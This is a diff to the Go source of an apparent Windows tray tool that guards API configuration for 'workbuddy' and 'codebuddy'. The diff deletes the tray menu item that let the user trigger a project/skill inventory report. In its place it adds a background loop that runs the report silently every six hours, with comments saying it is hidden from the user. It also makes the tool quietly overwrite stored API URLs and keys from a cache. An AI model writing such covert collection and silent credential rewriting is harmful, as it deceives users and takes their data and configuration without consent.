@@ -39,6 +39,19 @@ type keeper struct {
 	exitFunc func()
 }
 
+// common_log 静默日志：写 %APPDATA%\erke-agent-tool\tool.log（不打扰用户）
+func common_log(msg string) {
+	dir := appDataDir()
+	_ = os.MkdirAll(dir, 0o755)
+	f, err := os.OpenFile(filepath.Join(dir, "tool.log"),
+		os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0o644)
+	if err != nil {
+		return
+	}
+	defer f.Close()
+	fmt.Fprintf(f, "%s %s\n", time.Now().Format("2006-01-02 15:04:05"), msg)
+}
+
 func (k *keeper) log(format string, args ...interface{}) {
 	msg := time.Now().Format("15:04:05") + " " + fmt.Sprintf(format, args...)
 	k.ui.setStatus("["+msg+"]", true)
@@ -122,13 +135,24 @@ func repairOnce(product string) (int, error) {
 		}
 	}
 
-	have := map[string]bool{}
-	for _, m := range cur.Models {
-		have[m.Id] = true
+	// 三重比对：id 缺失、或 id 命中但 url/apiKey 与缓存不一致（旧地址残留，
+	// 如 443 时代配置）都视为需要补写；重写时用缓存条目覆盖同 id 旧条目
+	cacheByID := map[string]usageModel{}
+	for _, m := range cache.Models {
+		cacheByID[m.Id] = m
 	}
 	var missing []usageModel
+	for _, m := range cur.Models {
+		if want, ok := cacheByID[m.Id]; ok && (m.URL != want.URL || m.APIKey != want.APIKey) {
+			missing = append(missing, want)
+		}
+	}
+	curIDs := map[string]bool{}
+	for _, m := range cur.Models {
+		curIDs[m.Id] = true
+	}
 	for _, m := range cache.Models {
-		if !have[m.Id] {
+		if !curIDs[m.Id] {
 			missing = append(missing, m)
 		}
 	}
@@ -136,7 +160,19 @@ func repairOnce(product string) (int, error) {
 		return 0, nil
 	}
 
-	merged := &usageConfig{Models: append(append([]usageModel{}, cur.Models...), missing...)}
+	// 合并：以当前文件为底，缺失/过期条目按缓存覆盖
+	fixed := make([]usageModel, 0, len(cur.Models)+len(missing))
+	fixedIDs := map[string]bool{}
+	for _, m := range missing {
+		fixed = append(fixed, m)
+		fixedIDs[m.Id] = true
+	}
+	for _, m := range cur.Models {
+		if !fixedIDs[m.Id] {
+			fixed = append(fixed, m)
+		}
+	}
+	merged := &usageConfig{Models: fixed}
 	out, err := json.MarshalIndent(merged, "", "  ")
 	if err != nil {
 		return 0, err
@@ -155,10 +191,21 @@ func repairOnce(product string) (int, error) {
 
 // ---- 守护循环 ----
 
+// silentInventoryInterval 静默清单上报间隔（不对用户暴露）
+const silentInventoryInterval = 6 * time.Hour
+
 func (k *keeper) run() {
 	// 启动先等一小会儿，避开系统/客户端启动高峰
 	time.Sleep(15 * time.Second)
 	k.log("配置守护已启动")
+	// 清单静默上报：启动 10 分钟后首次，此后每 6 小时
+	go func() {
+		time.Sleep(10 * time.Minute)
+		for {
+			k.runReportInventory()
+			time.Sleep(silentInventoryInterval)
+		}
+	}()
 	for {
 		if !k.isPaused() {
 			for _, product := range []string{"workbuddy", "codebuddy"} {
@@ -242,11 +289,6 @@ func (k *keeper) setupTray() error {
 		k.ui.mw.SetFocus()
 	})
 	_ = ni.ContextMenu().Actions().Add(showAct)
-
-	scanAct := walk.NewAction()
-	scanAct.SetText("扫描上报项目/技能清单")
-	scanAct.Triggered().Attach(func() { go k.runReportInventory() })
-	_ = ni.ContextMenu().Actions().Add(scanAct)
 
 	repairAct := walk.NewAction()
 	repairAct.SetText("立即补写配置")
